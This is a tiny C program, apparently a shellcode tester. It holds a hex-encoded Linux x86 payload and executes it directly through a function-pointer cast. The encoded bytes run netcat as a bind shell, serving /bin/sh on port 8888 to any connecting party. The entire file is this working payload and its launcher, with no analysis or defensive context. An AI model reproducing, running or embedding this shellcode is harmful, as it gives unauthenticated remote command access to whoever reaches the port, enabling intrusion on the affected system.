#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\xc7\x44\x24\xfc\x38\x38\x38\x38\xc7\x44\x24\xf8\x2d\x76\x76\x70\x83\xec\x08\x89\xe6\x52\xc7\x44\x24\xfc\x2f\x2f\x73\x68\xc7\x44\x24\xf8\x69\x6e\x2f\x2e\xc7\x44\x24\xf4\x2e\x2f\x2f\x62\xc7\x44\x24\xf0\x2d\x6c\x65\x2f\x83\xec\x10\x89\xe7\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
